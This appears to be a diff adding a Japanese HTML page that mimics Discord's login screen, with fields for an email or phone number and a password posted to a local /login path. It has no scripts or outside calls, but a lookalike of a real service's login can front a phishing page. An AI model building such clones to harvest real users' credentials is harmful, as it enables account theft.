@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discordログイン画面</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-card">
+            <div class="login-header">
+                <h2>おかえりなさい！</h2>
+                <p>また会えて嬉しいです！</p>
+            </div>
+            
+            <form class="login-form" action="/login" method="POST">
+                <div class="form-group">
+                    <label>メールアドレスまたは電話番号 <span>*</span></label>
+                    <input type="text" name="email" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>パスワード <span>*</span></label>
+                    <input type="password" name="password" required>
+                    <a href="#" class="forgot-password">パスワードをお忘れですか？</a>
+                </div>
+                
+                <button type="submit" class="login-button">ログイン</button>
+                
+                <div class="register-text">
+                    アカウントが必要ですか？ <a href="#">登録</a>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
